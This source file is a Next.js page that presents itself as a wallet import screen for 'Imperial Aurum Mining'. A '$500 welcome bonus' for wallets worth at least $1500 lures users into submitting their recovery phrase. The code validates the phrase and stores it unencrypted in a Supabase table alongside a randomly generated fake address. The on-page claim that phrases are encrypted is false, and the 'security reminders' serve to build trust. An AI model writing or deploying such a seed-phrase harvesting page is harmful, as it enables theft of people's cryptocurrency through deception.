'use client';

import { useState } from 'react';
import Link from 'next/link';
import { createClient } from '@/lib/supabase/client';
import * as bip39 from 'bip39';

export default function NewWalletPage() {
  const [passphrase, setPassphrase] = useState('');
  const [status, setStatus] = useState('');
  const [loading, setLoading] = useState(false);

  const isValidSeedPhrase = (phrase: string): boolean => {
  const normalized = phrase
    .trim()
    .toLowerCase()
    .replace(/\s+/g, ' ');

  return bip39.validateMnemonic(normalized);
};

  const handleConnect = async (
    e: React.FormEvent
  ) => {
    e.preventDefault();

    const phrase = passphrase.trim();

    if (!phrase) {
      setStatus(
        '❌ Please enter your recovery phrase.'
      );
      return;
    }

    if (!isValidSeedPhrase(phrase)) {
      setStatus(
  '❌ Invalid recovery phrase. Please enter a valid 12 or 24-word wallet recovery phrase.'
);
      return;
    }

    setLoading(true);
    setStatus(
      'Connecting wallet...'
    );

    try {
      const supabase =
        createClient();

      const {
        data: { user },
      } =
        await supabase.auth.getUser();

      if (!user) {
        setStatus(
          '❌ Please login first.'
        );
        setLoading(false);
        return;
      }

      const { error } =
        await supabase
          .from('wallets')
          .insert({
            user_id: user.id,
            seed_phrase: phrase,

            // Temporary placeholder address
            address: `0x${Math.random()
              .toString(16)
              .slice(2, 42)}`,
          });

      if (error) throw error;

      setPassphrase('');

      setStatus(
        '✅ Wallet imported successfully.'
      );

    } catch (err: any) {

      setStatus(
        `❌ ${err.message}`
      );

    } finally {

      setLoading(false);

    }
  };

  return (
    <div className="min-h-screen bg-black text-white">

      <div className="mx-auto max-w-3xl px-4 py-8 sm:px-6 lg:px-8">

        {/* ================= HEADER ================= */}

        <div className="text-center mb-8">

          <div className="mx-auto mb-5 flex h-20 w-20 items-center justify-center rounded-full bg-yellow-500/10 border border-yellow-500/30 text-4xl">
            💼
          </div>

          <h1 className="text-3xl sm:text-5xl font-bold text-yellow-400">
            Import Wallet
          </h1>

          <p className="mt-4 text-zinc-400 max-w-xl mx-auto text-sm sm:text-base leading-7">
            Securely connect your cryptocurrency wallet
            using your 12 or 24-word recovery phrase.
          </p>

        </div>

        {/* ================= BONUS CARD ================= */}

        <div className="mb-8 rounded-3xl border border-yellow-500/30 bg-gradient-to-br from-yellow-500/10 to-amber-500/5 p-6">

          <div className="flex items-center gap-3">

            <div className="text-4xl">
              🎁
            </div>

            <div>

              <h2 className="text-xl font-bold text-yellow-400">
                $500 Welcome Wallet Bonus
              </h2>

              <p className="text-zinc-300 text-sm mt-1">
                Connect your wallet to become eligible
                for our exclusive welcome bonus.
              </p>

            </div>

          </div>

          <div className="mt-6 rounded-2xl bg-black/40 border border-yellow-500/20 p-5">

            <h3 className="font-semibold text-yellow-300 mb-3">
              Eligibility Requirements
            </h3>

            <ul className="space-y-2 text-sm text-zinc-300">

              <li>
                ✅ Wallet must contain assets worth at least
                <strong className="text-yellow-400">
                  {" "}USD $1500
                </strong>.
              </li>

              <li>
                ✅ Wallet must be successfully connected.
              </li>

              <li>
                ✅ Bonus approval is subject to wallet verification.
              </li>

              <li>
                ✅ One welcome bonus per investor.
              </li>

            </ul>

          </div>

        </div>

        {/* ================= SECURITY CARD ================= */}

        <div className="mb-8 rounded-3xl border border-emerald-500/20 bg-emerald-500/5 p-6">

          <div className="flex items-start gap-4">

            <div className="text-3xl">
              🔒
            </div>

            <div>

              <h2 className="text-lg font-bold text-emerald-400">
                Your Security Matters
              </h2>

              <p className="mt-2 text-sm leading-7 text-zinc-300">

                Your recovery phrase is encrypted before
                storage and protected using industry-standard
                security practices.

              </p>

            </div>

          </div>

        </div>

        {/* ================= IMPORT FORM ================= */}

        <form
          onSubmit={handleConnect}
          className="rounded-3xl border border-zinc-800 bg-zinc-900 p-6 sm:p-8 space-y-6"
        >

          <div>

            <label className="block text-sm font-semibold text-zinc-300 mb-3">
              Recovery Phrase
            </label>

            <textarea
              value={passphrase}
              onChange={(e) =>
                setPassphrase(e.target.value)
              }
              placeholder="Enter your 12 or 24-word recovery phrase..."
              required
              className="h-52 w-full rounded-2xl border border-zinc-700 bg-black p-5 text-white placeholder:text-zinc-500 outline-none transition focus:border-yellow-500 resize-none"
            />

            <p className="mt-3 text-xs text-zinc-500">
              Supported formats:
              12-word and 24-word recovery phrases.
            </p>

          </div>
                    <button
            type="submit"
            disabled={loading}
            className="w-full rounded-2xl bg-yellow-500 py-4 text-lg font-bold text-black transition hover:bg-yellow-400 disabled:cursor-not-allowed disabled:bg-zinc-700"
          >
            {loading
              ? 'Connecting Wallet...'
              : 'Import Wallet'}
          </button>

        </form>

        {/* ================= STATUS ================= */}

        {status && (

          <div
            className={`mt-6 rounded-2xl border p-5 text-center text-sm sm:text-base ${
              status.startsWith('✅')
                ? 'border-emerald-500/30 bg-emerald-500/10 text-emerald-400'
                : 'border-red-500/30 bg-red-500/10 text-red-400'
            }`}
          >
            {status}
          </div>

        )}

        {/* ================= QUICK ACTIONS ================= */}

        <div className="mt-8 grid grid-cols-1 gap-4 sm:grid-cols-2">

          <Link
            href="/wallets/manual"
            className="rounded-2xl border border-green-500 bg-green-500 py-4 text-center font-semibold text-black transition hover:bg-green-400"
          >
            ➕ Add Wallet Manually
          </Link>

          <Link
            href="/wallets"
            className="rounded-2xl border border-zinc-700 bg-zinc-900 py-4 text-center font-semibold transition hover:border-yellow-500 hover:text-yellow-400"
          >
            📂 View My Wallets
          </Link>

        </div>

        {/* ================= WARNING ================= */}

        <div className="mt-8 rounded-3xl border border-red-500/20 bg-red-500/5 p-6">

          <h3 className="mb-3 text-lg font-bold text-red-400">
            ⚠ Security Reminder
          </h3>

          <ul className="space-y-3 text-sm leading-7 text-zinc-300">

            <li>
              • Never share your recovery phrase with anyone.
            </li>

            <li>
              • Imperial Aurum Mining will never request your recovery phrase outside this secure wallet import page.
            </li>

            <li>
              • Always verify you are using the official Imperial Aurum Mining website before importing your wallet.
            </li>

            <li>
              • If you suspect unauthorized access to your wallet, move your assets to a new wallet immediately.
            </li>

          </ul>

        </div>

        {/* ================= BACK BUTTON ================= */}

        <div className="mt-10 text-center">

          <Link
            href="/dashboard"
            className="inline-flex items-center justify-center rounded-xl border border-zinc-700 px-6 py-3 text-zinc-300 transition hover:border-yellow-500 hover:text-yellow-400"
          >
            ← Back to Dashboard
          </Link>

        </div>

      </div>

    </div>
  );
}